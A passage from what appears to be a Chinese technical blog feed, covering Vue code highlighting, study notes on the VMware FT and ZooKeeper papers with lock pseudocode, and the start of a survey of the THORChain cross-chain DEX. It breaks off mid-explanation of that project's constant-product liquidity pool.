<h2 id="3-全局引入自定义插件"><a href="#3-全局引入自定义插件" class="headerlink" title="3. 全局引入自定义插件"></a>3. 全局引入自定义插件</h2><p>在<code>src/main.js</code>中：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// highlight.js代码高亮插件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Highlight</span> <span class="keyword">from</span> <span class="string">&#x27;./utils/highlight&#x27;</span>; <span class="comment">// from 路径是highlight.js的路径，纯属自定义</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Highlight</span>);</span><br></pre></td></tr></table></figure>

<h2 id="4-使用"><a href="#4-使用" class="headerlink" title="4. 使用"></a>4. 使用</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;codeView&quot;</span> <span class="attr">v-highlight</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">code</span> <span class="attr">v-html</span>=<span class="string">&quot;code&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>code</code>是代码的字符串形式，比如：</p>
<p><code>&quot;0x0000000000400da0 &lt;+0&gt;:\tpush\t%rbx\n0x0000000000400da1 &lt;+1&gt;:\tcmp\t$0x1,%edi\n0x0000000000400da4 &lt;+4&gt;:\tjne\t0x400db6 &lt;main+22&gt;\n&quot;</code></p>
<p>更换更多的代码高亮风格，需要切换<code>highlight.js</code>中导入的<code>css</code>文件。</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式之VMwareFT</title>
    <url>/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BVMwareFT.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>VMware公司在2010年发表了一篇有关虚拟机容错的论文：<a href="https://dl.acm.org/doi/10.1145/1899928.1899932" title="《The Design of a Practical System for Fault-Tolerant Virtual Machines》">《The Design of a Practical System for Fault-Tolerant Virtual Machines》</a>。同时，它也是MIT6.824 LEC4的Preparation Read。本文将结合课程简单介绍论文内容。</p>
<span id="more"></span>

<h2 id="1-主-x2F-备份"><a href="#1-主-x2F-备份" class="headerlink" title="1. 主&#x2F;备份"></a>1. 主&#x2F;备份</h2><p>实现服务器容错的一种通用方法是<strong>主&#x2F;备份(primary&#x2F;backup)</strong> 方法，当主服务器失效，备份服务器可以接管主服务器的工作。</p>
<p>为了保持主备状态同步，有2种方法：</p>
<ul>
<li><p>**状态传递(State transfer)**。将主服务器上的所有状态（包括CPU、内存等等）都发送给备份服务器。这种方法能保证主备状态一致，但每次需同步大量数据，会占用大量宽带。</p>
</li>
<li><p>**复制状态机(Replicated state machine)**。主备服务器一开始处于相同状态，对于每一条发送给主服务器的输入请求（比如将一个数加1），主服务器会发送给备份服务器，它们以相同顺序执行输入请求，从而保持同步。这种方法同步的信息较少，效率更高。但是，对于一些不确定请求，比如获取当前时间、获取随机数、多核计算，主备服务器执行结果可能并不相同，还需要额外的操作来保持同步。</p>
</li>
</ul>
<p>VMwareFT论文种使用了复制状态机来实现容错。</p>
<h2 id="2-基本设计"><a href="#2-基本设计" class="headerlink" title="2. 基本设计"></a>2. 基本设计</h2><p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BVMwareFT/image_EVWkBerzKf.png" alt="1"></p>
<p>主备虚拟机运行在不同的机器上，它们共享一个磁盘(Shared Disk)，主VM接收到的输入都通过日志通道(Logging channel)发送给备份VM。主备VM都执行相同操作，但只有主VM的输出才返回给客户端。</p>
<p>系统通过相关服务器之间的心跳和日志通道上的流量监控，来检测主备VM是否失效。</p>
<h3 id="确定性重放"><a href="#确定性重放" class="headerlink" title="确定性重放"></a>确定性重放</h3><p>对于不确定事件或操作，比如中断、获取时间等，可能会导致主备VM状态不一致。</p>
<p>VMware确定性重放(deterministic replay)机制，能够捕获所有输入和所有可能不确定输入，并记录到日志文件，通过读取日志，备份VM可以准确地重放执行。</p>
<p>对于不确定输入，必须记录足够的信息来保证重放。当然论文中并未介绍是哪些信息，一种可能的方式是直接记录执行结果，备份VM只需复制结果即可，而不需要再次执行。而<strong>对于多核计算，暂时没有有效机制来保证执行结果一致，因此论文中的虚拟机VM都规定是单核的</strong>。</p>
<p>（注：这一节为什么讲了跟没讲一样）</p>
<h3 id="FT-协议"><a href="#FT-协议" class="headerlink" title="FT 协议"></a>FT 协议</h3><p>考虑一种情况：VM上有一个数A值为10，客户端请求将A+&#x3D;1并返回结果，主VM接收请求后执行+1并返回11，但它正要将该请求告诉给备份VM时宕机了。备份VM接替了主VM，但由于备份VM并未收到请求，A的值依旧是10。此时，客户端再请求将A+&#x3D;1并返回，它再次得到11，显然这是不正确的。</p>
<p>为了防止这种情况的发生，论文设计了一条<strong>输出规则：对于需要输出的请求，主VM会等备份VM确认收到请求后（备份VM会返回ACK），再将输出返回。同时，主VM只是延迟输出，并不会阻塞后面的任务（异步）。</strong></p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BVMwareFT/image_2rKd5U6Fhq.png" alt="1"></p>
<p>但是，规则并不能保证结果只输出一次。比如：当主VM收到备份VM的ACK后，正要返回输出，但突然宕机了。备份VM接替之后，并不知道主VM是否已经返回输出，所以它会将最后一次输出再返回一次（其实之前的输出备份VM都不知道是否返回吧？）。当重复输出并无大碍，比如：对磁盘同一个位置重复写，一个数据包发两次（TCP能够检测重复的数据包）。</p>
<h3 id="检测和故障响应"><a href="#检测和故障响应" class="headerlink" title="检测和故障响应"></a>检测和故障响应</h3><p>主VM和备VM之间会通过<strong>UDP心跳</strong>和<strong>监控日志通道流量</strong>来检测对方服务是否正常，若停止的时间超过阈值，就说明出现故障。</p>
<p>不过这种检测方法并不能避免脑裂问题(split-brain) 。当备份VM长时间没有收到主VM的心跳和日志消息，可能是主VM宕机，也可能是网络问题。如果是因为暂时的网络问题，此时备份VM若顶替主VM，那网络上将出现2个主VM。</p>
<p>为了解决这个问题，VMware在共享磁盘上设置了test-and-set的原子操作 ，类似于一个锁，只能被一个VM获取，而只有拿到这个锁才能对共享磁盘进行操作。</p>
<h2 id="3-FT实际应用"><a href="#3-FT实际应用" class="headerlink" title="3. FT实际应用"></a>3. FT实际应用</h2><h3 id="创建备份VM"><a href="#创建备份VM" class="headerlink" title="创建备份VM"></a>创建备份VM</h3><p>VMware使用VMware vSphere现有的VMotion功能：将一个运行中的VM克隆到新机器上，而VM只需暂停不到1秒的时间。</p>
<p>同时，VMware vSphere实现了一个集群服务，它会根据主VM的备份请求选择合适的机器，然后通过VMotion进行克隆，这过程只需几分钟。</p>
<p>（细节啥也没说）</p>
<h3 id="管理日志通道"><a href="#管理日志通道" class="headerlink" title="管理日志通道"></a>管理日志通道</h3><p>为了管理监控日志通道，管理程序为日志通道维持了一个日志缓冲区，主VM向缓冲区写，备份VM从缓冲区读。</p>
<p>当缓冲区被填满（主VM写太快，备份VM读太慢）时，主VM将会停止执行，等待缓冲区有空闲。显然，这会影响客户端体验。为此，当缓冲区日志太多时，管理程序会降低主VM的执行速度（比如分配更少的CPU资源），等待备份VM消化缓存，更上日志进度。</p>
<p>当然，这种主VM减速很罕见。</p>
<h2 id="4-个人总结"><a href="#4-个人总结" class="headerlink" title="4. 个人总结"></a>4. 个人总结</h2><p>不同于数据库备份，虚拟机这种整个操作系统的备份确实困难且复杂。因为它存在许多不确定操作，比如中断、多核并行等，复现难度大。</p>
<p>个人认为， <em>对于操作繁多且复杂的场景，应该避免做操作的同步，而应该做数据状态的同步</em> 。比如，客户端请求对A进行+1操作，那么不应该让备份机器同步执行这个+1操作，而应该将A进行+1的结果同步给备份机器。当然，这其实就是在状态转移和复制状态机两种方式间做抉择。</p>
<p>这篇论文虽然并不详细，也没有带来多大的影响，但也有值得借鉴的点：</p>
<ol>
<li><p>主VM需要确定备份VM获取到请求后，再返回给客户端。不过要是备份VM执行失败了怎么办？</p>
</li>
<li><p>通过外部权威来解决脑裂问题。感觉不如超半数投票？</p>
</li>
</ol>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式之Zookeeper</title>
    <url>/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BZookeeper.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p><a href="https://pdos.csail.mit.edu/6.824/schedule.html" title="MIT6.824">MIT6.824</a> LEC9: Zookeeper。</p>
<p>当单机性能到达瓶颈时，我们需要对应用服务进行横向扩展，将同一个应用部署到多台服务器上，以提高整体性能。但新的解决方法总会带来新的问题：应用的配置（比如数据库连接、地址黑名单）需要更新时，如何进行统一更新？当多个应用对同一个外部资源进行修改时，如何保证同步互斥？为了解决这些问题，就有了Zookeeper的出现。</p>
<p>Zookeeper是大数据组件中的一员，由于它起到协调管理的作用，而其它大数据组件大多以动物名字命名，因此它就被称为动物园管理员。</p>
<p>Zookeeper是一个提供分布式协调的中心化服务，官网中的一句话介绍了Zookeeper的主要功能：<strong>配置管理、命名服务（类似于DNS）、分布式同步（分布式锁）和集群管理（集群节点的加入与退出）</strong>。</p>
<blockquote>
<p>ZooKeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services.</p>
</blockquote>
<p>接下来将结合Zookeeper论文来学习它的具体设计与实现。</p>
<span id="more"></span>

<h2 id="1-Zookeeper简介"><a href="#1-Zookeeper简介" class="headerlink" title="1. Zookeeper简介"></a>1. Zookeeper简介</h2><p>移除特定原语，比如锁，转而提供API给开发人员实现自己的原语。</p>
<p>无等待，ZooKeeper 实现了操作简单无等待数据对象的 API，这些数据对象的结构类似于文件系统。</p>
<p>ZooKeeper 保证所有操作遵循先进先出顺序和线性化写。</p>
<p>通过多副本，来实现高可用和高性能。</p>
<p>一主多从架构，主节点负责写和复制，所有节点都可以读。</p>
<p>实现了基于领导者的原子广播协议 Zab（类似Raft）。</p>
<p>使用 watch 机制，当数据更新时，客户端会收到通知。</p>
<h2 id="2-Zookeeper概述"><a href="#2-Zookeeper概述" class="headerlink" title="2. Zookeeper概述"></a>2. Zookeeper概述</h2><h3 id="2-1-会话"><a href="#2-1-会话" class="headerlink" title="2.1. 会话"></a>2.1. 会话</h3><p>客户端连接ZooKeeper时会初始化一个<strong>会话</strong>。会话有超时时间，当超时时间到期，ZooKeeper会认为客户端出现故障。当客户端关闭或者ZooKeeper探测到客户端故障之后，会话终止。在会话周期内，客户端可以观察到持续的状态变化，这些状态变化反映了有操作在执行。</p>
<h3 id="2-2-数据模型"><a href="#2-2-数据模型" class="headerlink" title="2.2. 数据模型"></a>2.2. 数据模型</h3><p>Zookeeper的数据模型类似于文件系统的<strong>树形结构</strong>，每个节点是一个可供客户端操作的数据对象<strong>znode</strong>。znode的命名（标识）采用<strong>类似于文件系统路径的层次化命名方式</strong>，比如znode C的名称为<code>/A/B/C</code>，那么C的父节点是B，B的父节点是A。采用层次化命名，能够对不同应用的命名空间分配子树，并且设置权限也比较方便。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BZookeeper/image_iNW38w9gTq.png" alt="1"></p>
<p>客户端可以创建两类znode：</p>
<ul>
<li><p><strong>普通</strong>：可以显式地删除，可以拥有孩子节点。</p>
</li>
<li><p><strong>临时</strong>：显式地删除或者在会话结束（主动结束或者因为故障结束）时自动删除，不可以拥有孩子节点。</p>
</li>
</ul>
<p>创建新的znode节点时，可以指定<strong>sequential</strong>标识：会在节点名称后添加一个数值，这个值按照兄弟节点顺序递增。</p>
<h3 id="2-3-客户端API"><a href="#2-3-客户端API" class="headerlink" title="2.3. 客户端API"></a>2.3. 客户端API</h3><ul>
<li><p><code>create(path, data, flags)</code>：使用 path 名称创建一个 znode 节点，保存 data，返回新创建的 znode 名称。 flags 用于创建普通或者临时节点，也可以设置顺序标识。</p>
</li>
<li><p><code>delete(path, version)</code>：删除指定 path 和 version 的 znode 节点。</p>
</li>
<li><p><code>exists(path, watch)</code>：如果指定 path 的 znode 存在则返回真，如果不存在则返回假。watch 标识用于在 znode 上设置监视器。</p>
</li>
<li><p><code>getData(path, watch)</code>：返回数据和元数据，如版本信息。watch 标识与 <code>exists()</code> 的 watch 标识一样，但如果 znode 不存在则不会设置监视器。</p>
</li>
<li><p><code>setData(path, data, version)</code>：根据 path 和 version 将数据写入到 znode。</p>
</li>
<li><p><code>getChildren(path, watch)</code>：返回 znode 所有子节点的名称集合。</p>
</li>
</ul>
<p>ZooKeeper实现了<strong>watch机制</strong>，使得客户端无需轮询就能够及时接受到状态变化的通知信息。当客户端发送了带有 watch 标识的读请求时，操作会正常完成，而<strong>服务器会在数据下一次发生变化时通知客户端</strong>。与一个会话关联的 watch只会触发一次；一旦触发或者会话结束，就会被注销。比如：客户端发送了<code>getData(&quot;/foo&quot;, watch=true)</code>请求，但客户端只会收到 <code>/foo</code> 第一次变化的通知信息。</p>
<p>更新操作（delete和setData）时，需指定版本号version。如果实际版本号与指定的版本号不一致，更新操作就会失败。如果版本号为-1，不会检查版本号。</p>
<h3 id="2-4-顺序保证"><a href="#2-4-顺序保证" class="headerlink" title="2.4. 顺序保证"></a>2.4. 顺序保证</h3><ul>
<li><p><strong>线性化写入</strong>：所有更新 ZooKeeper 状态的请求（写请求）都是线性化的并且遵守优先级。</p>
</li>
<li><p><strong>先进先出客户端顺序</strong>：对于一个客户端的所有请求，都会按客户端发送的顺序执行。由于网络情况复杂，一个客户端发出的一系列请求，到达时的顺序可能与发出时不尽相同。对此，可通过对请求添加序号，来保证客户端请求的顺序。</p>
</li>
</ul>
<h3 id="2-5-原语示例"><a href="#2-5-原语示例" class="headerlink" title="2.5. 原语示例"></a>2.5. 原语示例</h3><p>Zookeeper不提供特定原语，而是提供API由客户端自己实现原语，以下是一些原语的实现示例。</p>
<h4 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h4><p>Zookeeper支持分布式应用的动态配置管理，一种简单的形式是：配置信息保存在节点Z中，应用启动时读取节点信息并设置watch为true，当配置发生更新会通知应用，应用读取新的配置信息，并再次将watch设置为true。</p>
<h4 id="信息汇合"><a href="#信息汇合" class="headerlink" title="信息汇合"></a>信息汇合</h4><p>在一些分布式系统中，配置信息并不能提前知道，比如：客户端要启动一个主进程和几个工作进程，但启动进程由调度器完成，所以客户端不能提前知道进程的IP、端口等相关信息，而工作进程又需要知道主进程的IP和端口。</p>
<p>对此，可以在Zookeeper上创建一个节点Z，客户端将节点Z的路径作为主进程和工作进程的启动参数。当主进程启动时，可以将IP和端口号填入节点Z；当工作进程启动时，查询节点中数据，并将watch设置为true，如果节点Z中没有数据，工作进程会一直等待。</p>
<h4 id="群组关系"><a href="#群组关系" class="headerlink" title="群组关系"></a>群组关系</h4><p>创建一个节点Z表示一个群组。这个组的成员进程启动时，在节点Z下创建一个临时节点。进程故障或终止时，其关联的临时节点会被自动删除（会话结束）。</p>
<h4 id="简单锁"><a href="#简单锁" class="headerlink" title="简单锁"></a>简单锁</h4><p>可以用一个znode表示锁。客户端获取锁时，需要创建一个指定路径的临时节点。如果创建成功，客户端获取这个锁。如果创建失败，客户端设置watch读取该节点，当节点被占有者删除（释放锁），客户端会收到通知。客户端创建该节点后，可通过终止会话或者显式删除节点来释放锁，让给其它等待的客户端。</p>
<p>简单锁虽然简单，但存在着一些问题：</p>
<ul>
<li><p>群体效应。如果很多客户端等待锁，对这个锁的竞争就会很激烈，当锁释放时，仅有一个等待的客户端能获得锁。</p>
</li>
<li><p>仅仅实现了互斥锁。</p>
</li>
</ul>
<h4 id="无群体效应的简单锁"><a href="#无群体效应的简单锁" class="headerlink" title="无群体效应的简单锁"></a>无群体效应的简单锁</h4><p>用一个节点Z实现锁，将所有客户端请求按顺序排序，依次获得锁。</p>
<p>客户端lock伪代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">n = create(Z + “/lock-”, EPHEMERAL|SEQUENTIAL) <span class="comment">// 在节点Z下创建带递增序号的临时节点</span></span><br><span class="line">C = getChildren(Z, <span class="literal">false</span>) <span class="comment">// 获取节点Z下的所有节点</span></span><br><span class="line"><span class="comment">// 如果客户端创建的临时节点序号最小，获取锁</span></span><br><span class="line"><span class="keyword">if</span> n is lowest znode in C:</span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">p = znode in C ordered just before n <span class="comment">// 获取子节点序列中，客户端所创建的临时节点的前一个节点</span></span><br><span class="line"><span class="comment">// 如果它存在，等待监听事件</span></span><br><span class="line"><span class="keyword">if</span> exists(p, <span class="literal">true</span>):</span><br><span class="line">  wait <span class="keyword">for</span> watch event</span><br><span class="line"><span class="comment">// 当前一个节点不存在了，跳转到第2行</span></span><br><span class="line"><span class="keyword">goto</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>unlock伪代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">delete(n) <span class="comment">// 删除客户端创建的临时节点，代表释放锁</span></span><br></pre></td></tr></table></figure>

<p>改进后的优势：每次释放锁（移除节点），只会唤起一个客户端。</p>
<h4 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h4><p>改进上述lock代码，分为读写锁，unlock代码不变。</p>
<p>write lock:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">n = create(Z + “/write-”, EPHEMERAL|SEQUENTIAL) <span class="comment">// 创建代表写锁的带序号的临时节点</span></span><br><span class="line">C = getChildren(Z, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> n is lowest znode in C:</span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">p = znode in C ordered just before n</span><br><span class="line"><span class="keyword">if</span> exists(p, <span class="literal">true</span>):</span><br><span class="line">  wait <span class="keyword">for</span> event</span><br><span class="line"><span class="keyword">goto</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>read lock:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">n = create(Z + “/read-”, EPHEMERAL|SEQUENTIAL) <span class="comment">// 创建代表读锁的带序号的临时节点</span></span><br><span class="line">C = getChildren(Z, <span class="literal">false</span>)</span><br><span class="line"><span class="comment">// 如果子节点中没有写锁节点，则得到锁</span></span><br><span class="line"><span class="keyword">if</span> no write znodes lower than n in C:</span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待当前节点的上一个写锁节点</span></span><br><span class="line">p = write znode in C ordered just before n</span><br><span class="line"><span class="keyword">if</span> exists(p, <span class="literal">true</span>):</span><br><span class="line">  wait <span class="keyword">for</span> event</span><br><span class="line"><span class="keyword">goto</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="3-Zookeeper实现"><a href="#3-Zookeeper实现" class="headerlink" title="3. Zookeeper实现"></a>3. Zookeeper实现</h2><p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BZookeeper/image_7CYFU70Zb3.png" alt="1"></p>
<p>Zookeeper通过复制（多副本）实现高可用。</p>
<p>Zookeeper的数据保存在内存中。当数据更新时，会先将更新操作写入磁盘的日志中。当Zookeeper从故障中恢复时，会从日志中重放更新操作，以此恢复内存中数据到正常状态。</p>
<p>当Zookeeper服务收到写请求时，会先通过请求处理器执行请求，再通过 <strong>ZAB协议（分布式一致性协议，类似于raft）</strong> 将状态变更提交到所有的数据库；当收到读请求时，直接读取本地数据库返回响应消息。</p>
<h3 id="3-1-请求处理器Request-Processor"><a href="#3-1-请求处理器Request-Processor" class="headerlink" title="3.1. 请求处理器Request Processor"></a>3.1. 请求处理器Request Processor</h3><p>用于执行客户端的写请求，执行成功后，再将状态变更同步给其它副本。</p>
<p><strong>为什么不将写请求直接同步给其它副本呢？因为写请求可能执行失败。</strong>若直接将写请求同步给其它副本，那同步完成之后，发现执行失败，还要进行同步回滚，以保证一致性。而先在leader服务器上执行，只有执行成功的才会进行同步，而执行失败的直接返回，就不会浪费同步的时间。</p>
<h3 id="3-2-原子广播Atomic-Broadcast"><a href="#3-2-原子广播Atomic-Broadcast" class="headerlink" title="3.2. 原子广播Atomic Broadcast"></a>3.2. 原子广播Atomic Broadcast</h3><p>Zookeeper使用Zab协议来保证多副本一致性，Zab协议类似于Paxos和Raft。</p>
<p>当客户端发起写请求时，请求会被转发到leader节点，leader节点执行完写请求，再将变更信息同步到其它节点。当状态同步完成（超半数服务器同步状态成功）后，再响应给客户端。</p>
<h3 id="3-3-复制数据库Replicated-Database"><a href="#3-3-复制数据库Replicated-Database" class="headerlink" title="3.3. 复制数据库Replicated Database"></a>3.3. 复制数据库Replicated Database</h3><p>当Zookeeper从故障中恢复时，会重放日志中的操作。当日志中内容较多时，恢复需要很长时间。因此，当Zookeeper运行一段时间后，会生成快照。下次恢复时，只需要从快照开始即可。</p>
<h3 id="3-4-C-x2F-S交互"><a href="#3-4-C-x2F-S交互" class="headerlink" title="3.4. C&#x2F;S交互"></a>3.4. C&#x2F;S交互</h3><p>Zookeeper按顺序处理写请求，并且不会并发地处理其它请求。</p>
<p>读请求在每个服务器本地处理，不用转交给leader服务器，这样可以获取非常高的读性能。但缺点在于：<strong>可能会读到旧的状态数据（顺序一致性）</strong>。因为一次状态变更成功，只表明状态变更的日志提交到大多数的服务器上，并不代表所有服务器都已经执行了状态变更，有些服务器可能还处于旧状态。</p>
<p>Zookeeper按先进先出的顺序处理写请求，并<strong>在响应中包含zxid信息（当前状态的版本号）</strong>。在与客户端的心跳通信中，也会包含最新的zxid。如果客户端连接到新的服务器，会对比客户端和服务器的zxid，如果客户端的zxid更大，将不会建立会话。以此保证读到较新的数据，不是最新，因为客户端拿到的zxid不一定是最新的，但绝不会读到已读过的数据。同时，<strong>这样能保证单个客户端请求先进先出的顺序，客户端一定能够读到它上一次写入的数据。</strong>因为客户端发起写请求后，会得到写请求执行成功后的zxid。<strong>但这并不能保证客户端读到其它客户端写入的最新数据。</strong></p>
<p>另外，<strong>为了保证能够读到最新提交的数据（线性一致性），Zookeeper提供了<code>sync</code>接口：sync会等待leader将未处理的写操作全部写入到本地副本之后再执行</strong>（类似于一个不写数据的写请求）。客户端若要读取最新数据，可以先调用sync，再调用读操作。</p>
<h2 id="4-个人总结"><a href="#4-个人总结" class="headerlink" title="4. 个人总结"></a>4. 个人总结</h2><p>Zookeeper亮点：</p>
<ul>
<li><p>提供可灵活组合的基础API而不是直接提供固定功能。</p>
</li>
<li><p>提供watch机制，而不是让客户端轮询。</p>
</li>
<li><p>让用户根据场景在性能与一致性之间做取舍，默认使用较弱的顺序一致性以达到更高的系统性能，用户也能通过API获取较强的线性一致性。</p>
</li>
</ul>
<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h2><ul>
<li><a href="https://dl.acm.org/doi/10.5555/1855840.1855851">ZooKeeper | Proceedings of the 2010 USENIX conference on USENIX annual technical conference (acm.org)</a></li>
<li><a href="https://iswade.github.io/translate/zookeeper/">Zookeeper论文翻译 - iswade’s blog</a></li>
<li><a href="https://developer.aliyun.com/article/897839">漫画：什么是ZooKeeper？-阿里云开发者社区 (aliyun.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>THORChain项目调研</title>
    <url>/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h2><p>实习期间调研的公链跨链项目THORChain——一个去中心化跨链流动性网络，类似于Layer1 Uniswap，分享给大家。</p>
<span id="more"></span>

<h2 id="1-THORChain项目调研"><a href="#1-THORChain项目调研" class="headerlink" title="1 THORChain项目调研"></a>1 THORChain项目调研</h2><h3 id="1-1-项目团队介绍"><a href="#1-1-项目团队介绍" class="headerlink" title="1.1 项目团队介绍"></a>1.1 项目团队介绍</h3><p>THORChain（雷神链）第一次现身是在2018年的Binance Hackathon，THORChain团队在竞赛中以DEX为目标开发了THORChain雏形。在此之后，THORChain团队持续对THORChain的技术进行开发。团队在2021年4月13日正式上线THORChain的测试网络ChaosNet，并计划在2022年1月上线主网，7月之前将网络控制权完全移交给社区。</p>
<p>THORChain的开发团队始终都保持着隐私性，直至今日，THORChain官方始终没有公布开发团队的信息，唯一可知的就是核心团队大概有20人左右构成。目前THORChain有一个官方发言人Chad Barraford，Chad是目前THORChain的CTO，为核心成员之一。</p>
<p>Chad于2019年加入THORChain，曾就读于University of Massachusetts Dartmouth。在2005年毕业后，Chad曾在不同的公司担任软件开发者的职位。Chad在2017年正式了解和进入crypto领域，并在同年创立了自己的第一个公司Cryptocades，Cryptocades利用游戏玩家电脑上的空闲算力来为开采Monero，但是公司在推出Beta版本后快速遇到技术问题，在六个月后关闭。之后，Chad加入了一个叫做Octagon Careers的线上职业申请平台公司，担任CTO的职位，Octagon Careers在五个月后倒闭，随后Chad加入了THORChain。</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_8KSJZTRHpJ.png" alt="1"></p>
<h3 id="1-2-项目融资概况"><a href="#1-2-项目融资概况" class="headerlink" title="1.2 项目融资概况"></a>1.2 项目融资概况</h3><p>市值情况：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_ES3WSxPiuK.png" alt="1"></p>
<p>融资概述：</p>
<ol>
<li><p>Seed Round：2018年，未知投资者投资600K USD。在此时间段，THORChain参与了Binance组织的Hackathon；</p>
</li>
<li><p>Private Sale：2019年7月，True Ventures领投1.6M USD；</p>
</li>
<li><p>IDO：2019年7月，220K USD；</p>
</li>
<li><p>2021年10月，THORSwap完成375万美元融资，IDEO CoLab Ventures领投，True Ventures、Sanctor Capital、THORChain、Nine Realms、Proof Group、0xVentures、Qi Capital等参投。</p>
</li>
</ol>
<h3 id="1-3-产品定位"><a href="#1-3-产品定位" class="headerlink" title="1.3 产品定位"></a>1.3 产品定位</h3><p>THORChain目标是创建一个具有激励性的去中心化交易平台(DEX)，具有以下特点：</p>
<ul>
<li><p>能够跨链交换Layer1币（原生币），比如BTC、ETH；</p>
</li>
<li><p>用户不需要许可就可以加入；</p>
</li>
<li><p>透明、公开的价格，无中心化的第三方；</p>
</li>
<li><p>能够最大化效率的连续流动性池(Continuous Liquidity Pools)。</p>
</li>
</ul>
<p>综上，THORChain可以看作Layer1的Uniswap。</p>
<h2 id="2-技术调研情况"><a href="#2-技术调研情况" class="headerlink" title="2 技术调研情况"></a>2 技术调研情况</h2><h3 id="2-1-技术介绍"><a href="#2-1-技术介绍" class="headerlink" title="2.1 技术介绍"></a>2.1 技术介绍</h3><p>THORChain是一款基于<strong>Tendermint&amp;Cosmos-SDK</strong>和<strong>TSS</strong>的区块链。其中，Tendermint是一个拜占庭容错（BFT）共识算法，Cosmos-SDK是一个用于快速构建区块链的框架，TSS是门限签名算法。这3个技术较为著名，网上文档比较多，就不在此赘述了。以下将主要介绍THORChain特有的一些技术。</p>
<h3 id="流动性模型"><a href="#流动性模型" class="headerlink" title="流动性模型"></a>流动性模型</h3><p>THORChain作为一个去中心交易平台(DEX, decentralised exchanges)，它不同于传统的中心化交易所，它通过流动性模型让用户能以公开透明的价格交易资产，无需依赖第三方。THORChain使用的流动性模型为持续流动性池(CLP, continuous liquidity pools)，它与uniswap的流动性模型基本相同。</p>
<p>在THORChain中，有多个流动池，每个流动池由RUNE原生币和其它资产组成。流动池有两类参与者：</p>
<ul>
<li><p>流动性提供者(LP, Liquidity Provider)。它们会向流动池提供<strong>资产对</strong>（注入流动性）并从中获益，比如：向RUNE:ETH流动池中注入10个RUNE和1个ETH。</p>
</li>
<li><p>交易者(Trader)。它们通过流动池进行资产交易，比如：交易者想要用ETH交换RUNE时，可以向RUNE:ETH流动池中，注入（卖出）RUNE，而后提取（买入）ETH。交易者与流动性提供者的一个大区别在于：交易者一次只注入一种资产，从而换取另一种资产，而流动性提供者一次注入 <strong>一对（两种）</strong> 资产。</p>
</li>
</ul>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_IcjVO-YTK0.png" alt="1"></p>
<p>在流动池中，假设两种资产的数量分别为X和Y，它们需满足一个恒定的公式<code>X * Y = K</code>，其中K是一个常量（LP可以改变这个K）。通过这个公式：</p>
<ul>
<li><p>用户能够自动进行交易，示例：假设RUNE:ETH的流动池中，有10个RUNE和1个ETH，那么<code>K = 10*1 = 10</code>。此时一个用户注入了3个RUNE，为了满足公式，池中剩余的ETH应该为<code>K/(10+3) = 10/13 = 0.77</code>，那么用户将兑换得到<code>1 - 0.77 = 0.23</code>个ETH。</p>
</li>
